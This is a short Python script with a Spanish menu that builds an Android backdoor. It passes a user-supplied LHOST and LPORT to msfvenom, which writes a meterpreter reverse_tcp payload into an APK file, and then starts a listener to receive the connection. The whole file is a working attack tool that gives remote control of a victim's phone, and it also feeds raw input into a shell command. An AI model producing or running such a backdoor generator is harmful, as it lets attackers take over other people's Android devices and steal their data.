#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('listener/')
from listener import *

print("""
		1.- Crear Backdoor 
		2.- Configurar Listener
""")
sel = raw_input("Selecciona una opcion:")
if(sel=="1"):
	s = raw_input("Para crear el Backdoor presione 1: ")
	if(s=="1"):
		os.system("clear")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /home/kali/Desktop/test_backdoor.apk")
		print("Se genero el Backdoor.... ")
		listener()
if(sel=="2"):
	listener()


	 


	

		
	 
 
                         
                                          
